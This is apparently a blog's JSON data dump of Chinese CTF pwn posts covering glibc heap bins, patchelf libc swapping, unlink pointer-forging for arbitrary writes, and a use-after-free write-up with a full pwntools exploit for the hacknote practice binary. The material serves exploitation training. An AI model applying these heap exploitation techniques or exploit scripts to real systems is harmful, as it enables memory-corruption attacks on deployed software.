（64位中0x20-0x80）每一个链表中存放的chunk大小相同，相邻bin存放的大小差0x8（0x10）字节</p>\n<p>新的chunk加入bin时，<strong>fd</strong>指向原来的栈顶</p>\n<h4 id=\"unsorted-bin\"><a href=\"#unsorted-bin\" class=\"headerlink\" title=\"unsorted bin\"></a>unsorted bin</h4><p>大于global_max_fast（fast bin最大大小）的chunk都会放进来</p>\n<h4 id=\"small-bin\"><a href=\"#small-bin\" class=\"headerlink\" title=\"small bin\"></a>small bin</h4><p>存放小于0x200（0x400）的，也就是0x10-0x1f0（0x20-0x3f0）chunk，和fast bin相同，每个bin大小递增，因此有62个small bin</p>\n<h4 id=\"large-bin\"><a href=\"#large-bin\" class=\"headerlink\" title=\"large bin\"></a>large bin</h4><p>大于0x200（0x400），每一个bin中chunk大小不是相同的，按照大小降序排列</p>\n<h3 id=\"内存分配流程\"><a href=\"#内存分配流程\" class=\"headerlink\" title=\"内存分配流程\"></a>内存分配流程</h3><p> <img src=\"/img/heapexploitation/1.jpg\"></p>\n<h3 id=\"内存释放流程\"><a href=\"#内存释放流程\" class=\"headerlink\" title=\"内存释放流程\"></a>内存释放流程</h3><p> <img src=\"/img/heapexploitation/2.jpg\"></p>\n<p><a href=\"https://heap-exploitation.dhavalkapil.com/\">Heap Exploitation</a></p>\n<p><a href=\"https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/\">Understanding glibc malloc</a></p>\n<p><a href=\"https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/\">Syscalls used by malloc</a></p>\n<p><a href=\"https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf\">glibc 内存管理 ptmalloc 源代码分析</a></p>\n<p><a href=\"https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/\">Painless intro to the Linux userland heap</a></p>\n"},{"title":"patchelf修改libc版本","date":"2022-11-27T08:00:00.000Z","excerpt":"修改libc版本","_content":"\n#### 安装glibc-all-in-one\n\n```shell\ngit clone https://github.com/matrix1001/glibc-all-in-one\ncd glibc-all-in-one\n./update_list\ncat list \n./download <libc-in-list>\n```\n\n#### 修改libc.so和ld.so\n\n```sh\npatchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  <path-to-elf>\n\npatchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  <path-to-elf>\n# param1 : old libc.so\n# param2 : new libc.so\n# param3 : path to elf\n```\n\n\n\n#### 效果图\n\n![](/img/patchelf/1.png)\n\n","source":"_posts/ctf-pwn/patchelf修改程序libc版本.md","raw":"---\ntitle: patchelf修改libc版本\ntags: [ctf-pwn]\ndate: 2022-11-27 16:00:00\ncategories: [ctf-pwn]\nexcerpt: 修改libc版本\n---\n\n#### 安装glibc-all-in-one\n\n```shell\ngit clone https://github.com/matrix1001/glibc-all-in-one\ncd glibc-all-in-one\n./update_list\ncat list \n./download <libc-in-list>\n```\n\n#### 修改libc.so和ld.so\n\n```sh\npatchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  <path-to-elf>\n\npatchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  <path-to-elf>\n# param1 : old libc.so\n# param2 : new libc.so\n# param3 : path to elf\n```\n\n\n\n#### 效果图\n\n![](/img/patchelf/1.png)\n\n","slug":"ctf-pwn/patchelf修改程序libc版本","published":1,"updated":"2022-12-23T08:29:45.245Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clc0969gl000d78uffd3h7wpi","content":"<h4 id=\"安装glibc-all-in-one\"><a href=\"#安装glibc-all-in-one\" class=\"headerlink\" title=\"安装glibc-all-in-one\"></a>安装glibc-all-in-one</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"修改libc-so和ld-so\"><a href=\"#修改libc-so和ld-so\" class=\"headerlink\" title=\"修改libc.so和ld.so\"></a>修改libc.so和ld.so</h4><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class=\"hljs-comment\"># param1 : old libc.so</span><br><span class=\"hljs-comment\"># param2 : new libc.so</span><br><span class=\"hljs-comment\"># param3 : path to elf</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"效果图\"><a href=\"#效果图\" class=\"headerlink\" title=\"效果图\"></a>效果图</h4><p><img src=\"/img/patchelf/1.png\"></p>\n","site":{"data":{}},"more":"<h4 id=\"安装glibc-all-in-one\"><a href=\"#安装glibc-all-in-one\" class=\"headerlink\" title=\"安装glibc-all-in-one\"></a>安装glibc-all-in-one</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"修改libc-so和ld-so\"><a href=\"#修改libc-so和ld-so\" class=\"headerlink\" title=\"修改libc.so和ld.so\"></a>修改libc.so和ld.so</h4><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class=\"hljs-comment\"># param1 : old libc.so</span><br><span class=\"hljs-comment\"># param2 : new libc.so</span><br><span class=\"hljs-comment\"># param3 : path to elf</span><br></code></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"效果图\"><a href=\"#效果图\" class=\"headerlink\" title=\"效果图\"></a>效果图</h4><p><img src=\"/img/patchelf/1.png\"></p>\n"},{"title":"unlink","date":"2022-11-25T02:19:00.000Z","excerpt":"unlink","_content":"\n> 以下内容一律假设 sz = 4 bytes  ，32位系统\n\n#### unlink时向任意地址写入数据原理\n\n假设需要从bin中摘除一个**首地址为P**的chunk\n\n32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12\n\n即 `fd = P+8 ` ，`bk = P+12`\n\n```C\n// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值\n*(*(P+8)+12) = *(P+12)\n// 将P.bk指向的块的fd 赋值为 P.fd上的值\n*(*(P+12)+8) = *(P+8)\n```\n\n假设想要向0x4000000C这个地址上写入0xdeadbeef这个值\n\n只需将`*(P+8)`赋值为0x40000000，将`*(P+12)`赋值为0xdeadbeef，在unlink时就会完成赋值\n\n这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value\n\n> 也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法\n\nunlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限\n\n#### 加入检查机制之后\n\n```C\nFD = P->fd;\nBK = P->bk;\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \nFD->bk = BK;\nBK->fd = FD;\n```\n\n因此溢出时需要额外保证以下条件\n\n```\n*(*(P+8) +12) == P\n*(*(P+12)+ 8) == P\n```\n\n所以需要找到堆管理列表里面指向chunk P的指针**ptr**，让P的fd指向ptr-12，P的bk指向ptr-8，这样P->fd->bk指向P，P->bk->fd也指向P。\n\n绕过if判断之后，下面两条赋值语句首先将 FD->bk（也就是ptr）指向了BK，再将BK->fd（还是ptr，又改变了一次ptr）指向了FD。\n\n因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)\n","source":"_posts/ctf-pwn/unlink.md","raw":"---\ntitle: unlink \ntags: [ctf-pwn]\ndate: 2022-11-25 10:19:00\ncategories: [ctf-pwn]\nexcerpt: unlink \n---\n\n> 以下内容一律假设 sz = 4 bytes  ，32位系统\n\n#### unlink时向任意地址写入数据原理\n\n假设需要从bin中摘除一个**首地址为P**的chunk\n\n32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12\n\n即 `fd = P+8 ` ，`bk = P+12`\n\n```C\n// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值\n*(*(P+8)+12) = *(P+12)\n// 将P.bk指向的块的fd 赋值为 P.fd上的值\n*(*(P+12)+8) = *(P+8)\n```\n\n假设想要向0x4000000C这个地址上写入0xdeadbeef这个值\n\n只需将`*(P+8)`赋值为0x40000000，将`*(P+12)`赋值为0xdeadbeef，在unlink时就会完成赋值\n\n这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value\n\n> 也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法\n\nunlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限\n\n#### 加入检查机制之后\n\n```C\nFD = P->fd;\nBK = P->bk;\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \nFD->bk = BK;\nBK->fd = FD;\n```\n\n因此溢出时需要额外保证以下条件\n\n```\n*(*(P+8) +12) == P\n*(*(P+12)+ 8) == P\n```\n\n所以需要找到堆管理列表里面指向chunk P的指针**ptr**，让P的fd指向ptr-12，P的bk指向ptr-8，这样P->fd->bk指向P，P->bk->fd也指向P。\n\n绕过if判断之后，下面两条赋值语句首先将 FD->bk（也就是ptr）指向了BK，再将BK->fd（还是ptr，又改变了一次ptr）指向了FD。\n\n因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)\n","slug":"ctf-pwn/unlink","published":1,"updated":"2022-12-23T08:29:53.997Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clc0969gm000h78uf2o6h7e5p","content":"<blockquote>\n<p>以下内容一律假设 sz = 4 bytes  ，32位系统</p>\n</blockquote>\n<h4 id=\"unlink时向任意地址写入数据原理\"><a href=\"#unlink时向任意地址写入数据原理\" class=\"headerlink\" title=\"unlink时向任意地址写入数据原理\"></a>unlink时向任意地址写入数据原理</h4><p>假设需要从bin中摘除一个<strong>首地址为P</strong>的chunk</p>\n<p>32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12</p>\n<p>即 <code>fd = P+8 </code> ，<code>bk = P+12</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-comment\">// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值</span><br>*(*(P+<span class=\"hljs-number\">8</span>)+<span class=\"hljs-number\">12</span>) = *(P+<span class=\"hljs-number\">12</span>)<br><span class=\"hljs-comment\">// 将P.bk指向的块的fd 赋值为 P.fd上的值</span><br>*(*(P+<span class=\"hljs-number\">12</span>)+<span class=\"hljs-number\">8</span>) = *(P+<span class=\"hljs-number\">8</span>)<br></code></pre></td></tr></table></figure>\n\n<p>假设想要向0x4000000C这个地址上写入0xdeadbeef这个值</p>\n<p>只需将<code>*(P+8)</code>赋值为0x40000000，将<code>*(P+12)</code>赋值为0xdeadbeef，在unlink时就会完成赋值</p>\n<p>这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value</p>\n<blockquote>\n<p>也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法</p>\n</blockquote>\n<p>unlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限</p>\n<h4 id=\"加入检查机制之后\"><a href=\"#加入检查机制之后\" class=\"headerlink\" title=\"加入检查机制之后\"></a>加入检查机制之后</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class=\"hljs-keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"hljs-number\">0</span>))                      <br>  malloc_printerr (check_action, <span class=\"hljs-string\">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>\n\n<p>因此溢出时需要额外保证以下条件</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs lisp\">*(<span class=\"hljs-name\">*</span>(<span class=\"hljs-name\">P+8</span>) <span class=\"hljs-number\">+12</span>) == P<br>*(<span class=\"hljs-name\">*</span>(<span class=\"hljs-name\">P+12</span>)+ <span class=\"hljs-number\">8</span>) == P<br></code></pre></td></tr></table></figure>\n\n<p>所以需要找到堆管理列表里面指向chunk P的指针<strong>ptr</strong>，让P的fd指向ptr-12，P的bk指向ptr-8，这样P-&gt;fd-&gt;bk指向P，P-&gt;bk-&gt;fd也指向P。</p>\n<p>绕过if判断之后，下面两条赋值语句首先将 FD-&gt;bk（也就是ptr）指向了BK，再将BK-&gt;fd（还是ptr，又改变了一次ptr）指向了FD。</p>\n<p>因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)</p>\n","site":{"data":{}},"more":"<blockquote>\n<p>以下内容一律假设 sz = 4 bytes  ，32位系统</p>\n</blockquote>\n<h4 id=\"unlink时向任意地址写入数据原理\"><a href=\"#unlink时向任意地址写入数据原理\" class=\"headerlink\" title=\"unlink时向任意地址写入数据原理\"></a>unlink时向任意地址写入数据原理</h4><p>假设需要从bin中摘除一个<strong>首地址为P</strong>的chunk</p>\n<p>32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12</p>\n<p>即 <code>fd = P+8 </code> ，<code>bk = P+12</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-comment\">// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值</span><br>*(*(P+<span class=\"hljs-number\">8</span>)+<span class=\"hljs-number\">12</span>) = *(P+<span class=\"hljs-number\">12</span>)<br><span class=\"hljs-comment\">// 将P.bk指向的块的fd 赋值为 P.fd上的值</span><br>*(*(P+<span class=\"hljs-number\">12</span>)+<span class=\"hljs-number\">8</span>) = *(P+<span class=\"hljs-number\">8</span>)<br></code></pre></td></tr></table></figure>\n\n<p>假设想要向0x4000000C这个地址上写入0xdeadbeef这个值</p>\n<p>只需将<code>*(P+8)</code>赋值为0x40000000，将<code>*(P+12)</code>赋值为0xdeadbeef，在unlink时就会完成赋值</p>\n<p>这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value</p>\n<blockquote>\n<p>也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法</p>\n</blockquote>\n<p>unlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限</p>\n<h4 id=\"加入检查机制之后\"><a href=\"#加入检查机制之后\" class=\"headerlink\" title=\"加入检查机制之后\"></a>加入检查机制之后</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class=\"hljs-keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class=\"hljs-number\">0</span>))                      <br>  malloc_printerr (check_action, <span class=\"hljs-string\">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>\n\n<p>因此溢出时需要额外保证以下条件</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs lisp\">*(<span class=\"hljs-name\">*</span>(<span class=\"hljs-name\">P+8</span>) <span class=\"hljs-number\">+12</span>) == P<br>*(<span class=\"hljs-name\">*</span>(<span class=\"hljs-name\">P+12</span>)+ <span class=\"hljs-number\">8</span>) == P<br></code></pre></td></tr></table></figure>\n\n<p>所以需要找到堆管理列表里面指向chunk P的指针<strong>ptr</strong>，让P的fd指向ptr-12，P的bk指向ptr-8，这样P-&gt;fd-&gt;bk指向P，P-&gt;bk-&gt;fd也指向P。</p>\n<p>绕过if判断之后，下面两条赋值语句首先将 FD-&gt;bk（也就是ptr）指向了BK，再将BK-&gt;fd（还是ptr，又改变了一次ptr）指向了FD。</p>\n<p>因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)</p>\n"},{"title":"UAF","date":"2022-11-22T12:37:00.000Z","excerpt":"User After Free in Heap Exploitation","_content":"\n#### 参考ctf-wiki\n\n<https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote>\n\n以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）\n\n#### 漏洞的发现\n\n在`del_note()`函数中free掉指针之后没有清零：\n\n```C\nvoid del_note() {\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) {\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n  }\n}\n// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note\n```\n\n程序中给了system：\n\n````C\nint magic()\n{\n  return system(\"cat flag\");\n}\n````\n\n#### 漏洞利用方法\n\nexp如下\n\n```python\nadd(0x20, 'aaaa\\n')\nadd(0x20, 'bbbb\\n')\ndelete(0)\ndelete(1)\nadd(0x8, p32(magic))\nshow(0)\n```\n\n下面介绍这个exp的原理\n\n在delete 0和1之后fastbin结构如下图\n\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-22T16:47:04.851Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;xMjKslWb0NtHo6yfLEq6\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;wU8d93oxY3eO_jrvUp61\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}\"></div>\n<script type=\"text/javascript\" src=\"https://app.diagrams.net/js/viewer-static.min.js\"></script>\n\nchunk A是申请的`note[0]`结构体的空间，chunk B是`note[0]->content`的空间\n\nchunk C、D是`note[1]`的空间\n\n由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。\n\n当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。\n\n因此`add(0x8,p32(magic))`会把magic地址写入content，调用show的时候，会直接执行这个函数。\n\n理论是如此，下面用gdb验证一下\n\n#### 调试\n\n完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist\n\n```python\nfrom pwn import *\nr = process(file_name)\nelf = ELF('./hacknote')\nmenu = 'Your choice :'\n\ndef add(size, content):\n    r.sendlineafter(menu, '1')\n    r.sendlineafter('Note size :', str(size))\n    r.sendafter('Content :', content)\n\ndef delete(index):\n    r.sendlineafter(menu, '2')\n    r.sendlineafter('Index :', str(index))\n\ndef show(index):\n    r.sendlineafter(menu, '3')\n    r.sendlineafter('Index :', str(index))\n\ndef dbg():\n    gdb.attach(r)\n\nadd(0x20, 'aaaa\\n')\nadd(0x20, 'bbbb\\n')\ndbg()\ndelete(0)\ndelete(1)\ndbg()\nmagic = 0x08048986\nadd(0x8, p32(magic))\ndbg()\nshow(0)\nr.interactive()\n```\n\n在ida中可以看到notelist的地址\n\n```assembly\n.bss:0804A070 ; void *notelist\n.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r\n.bss:0804A070                                         ; add_note+61↑w ...\n.bss:0804A074                 db    ? ;\n```\n\n查看三次notelist的内容，\n\n![](/img/UAF/1.jpg)\n\n![](/img/UAF/2.jpg)\n\n![](/img/UAF/3.jpg)\n\n可以看到，`0x92f31a0`上的地址为print_note函数的地址，在free之前，`0x92f31a4`上的内容指向下一行开头，即`aaaa`字符串，所以这里就是note[0]。\n\n在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic\n\n","source":"_posts/ctf-pwn/堆利用 UAF.md","raw":"---\ntitle: UAF\ntags: [ctf-pwn,exp]\ndate: 2022-11-22 20:37:00\ncategories: [ctf-pwn]\nexcerpt: User After Free in Heap Exploitation\n---\n\n#### 参考ctf-wiki\n\n<https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote>\n\n以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）\n\n#### 漏洞的发现\n\n在`del_note()`函数中free掉指针之后没有清零：\n\n```C\nvoid del_note() {\n  char buf[4];\n  int idx;\n  printf(\"Index :\");\n  read(0, buf, 4);\n  idx = atoi(buf);\n  if (idx < 0 || idx >= count) {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if (notelist[idx]) {\n    free(notelist[idx]->content);\n    free(notelist[idx]);\n    puts(\"Success\");\n  }\n}\n// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note\n```\n\n程序中给了system：\n\n````C\nint magic()\n{\n  return system(\"cat flag\");\n}\n````\n\n#### 漏洞利用方法\n\nexp如下\n\n```python\nadd(0x20, 'aaaa\\n')\nadd(0x20, 'bbbb\\n')\ndelete(0)\ndelete(1)\nadd(0x8, p32(magic))\nshow(0)\n```\n\n下面介绍这个exp的原理\n\n在delete 0和1之后fastbin结构如下图\n\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-22T16:47:04.851Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;xMjKslWb0NtHo6yfLEq6\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;wU8d93oxY3eO_jrvUp61\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadm